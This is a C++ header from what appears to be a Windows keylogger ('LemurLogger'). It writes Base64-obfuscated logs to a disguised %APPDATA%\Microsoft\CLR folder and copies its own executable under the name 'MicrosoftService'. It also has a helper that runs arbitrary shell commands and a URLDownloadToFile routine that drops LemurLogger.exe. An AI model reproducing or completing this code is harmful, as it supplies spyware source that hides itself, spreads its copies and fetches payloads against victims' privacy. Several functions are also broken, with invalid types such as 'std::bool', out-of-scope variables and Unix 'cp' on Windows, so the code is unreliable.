#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include <windows.h>
#include "Helper.h"
#include "Base64.h"
//#include <Urlmon.h>
#include <tchar.h>
#include <vector>

namespace IO
{
  std::string GetOurPath(const bool append_seperator = false)
  {
    std::string appdata_dir(getenv("APPDATA"));
    std::string full = appdata_dir + "\\Microsoft\\CLR";
    return full + (append_seperator ? "\\" : "");
  }

  bool MkOneDr(std::string path)
  {
    return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
  }

  bool MkDir(std::string path)
  {
      for(char &c : path)
        if (c == '\\')
        {
            c = '\0';
            if (!MkOneDr(path))
                return false;
            c = '\\';
        }
    return true;
  }

  template <class T>
  std::string WriteLog(const T &t)
  {
    std::string path = GetOurPath(true);
    Helper::DateTime dt;
    std::string name = dt.GetDateTimeString("_") + ".log";

    try
    {
      std::ofstream file(path + name);
      if (!file) return "";
      std::ostringstream s;
      s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
      std::string data = BASE64::EncryptB64(s.str());
      file << data;
      if(!file) return "";
      file.close();
      return name;
    }
    catch(...)
    {
      return "";
    }
  }


    bool copy(std::string path,std::string filename){
        TCHAR szExeFileName[MAX_PATH] = TEXT("MicrosoftService");
        //get self name
        std::string cur_path_filename = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
        //open self
        ifstream initialFile(cur_path_filename, ios::in|ios::binary);
        //open outfile
        ofstream outputFile(path+filename, ios::out|ios::binary);
        //read pointer to end binary
        initialFile.seekg(0, ios::end);
        //set fileSize call buffer
        long fileSize = initialFile.tellg();
        if(initialFile.is_open() && outputFile.is_open())
        {
            short * buffer = new short[fileSize/2];
            initialFile.seekg(0, ios::beg);
            initialFile.read((char*)buffer, fileSize);
            outputFile.write((char*)buffer, fileSize);
            delete[] buffer;
        }
        else if(!outputFile.is_open())
        {
            return false;
        }
        else if(!initialFile.is_open())
        {
            return false;
        }

        initialFile.close();
        outputFile.close();
        return true;
    }



    std::void shell_cmd(std::string command){
        system(command);
    }

    std::bool copy_w_cmd(std::string path,std::string filename){
        std::string cur_path_filename = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
        std::string command = "cp "+cur_path_filename+" "+path+filename;
        try {
            system(command);
        } catch (std::exception const& e) {
            return false;
        }
        return true;

    }

    std::bool ms_Copyfile(const char * desfile_path){
        const char * cur_path_filename = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
        if (CopyFile (cur_path_filename, desfile_path, true))
            return false;

        else
           return true;

    }

    std::bool download_File(std::string urlfile,TCHAR * despath)
    {

        TCHAR url[] = TEXT(urlfile);
        TCHAR path[MAX_PATH] = despath;
        //GetCurrentDirectory(MAX_PATH, path);
        wsprintf(path, TEXT("%s\\LemurLogger.exe"), path);
        //printf("Path: %S\n", path);
        HRESULT res = URLDownloadToFile(NULL, url, path, 0, NULL);
        if(res == S_OK) {
            return true;
        } else if(res == E_OUTOFMEMORY) {
            return false;

        } else if(res == INET_E_DOWNLOAD_FAILURE) {
            return false;

        } else {
            return false;
        }

        return false;
    }
}


#endif // IO_H
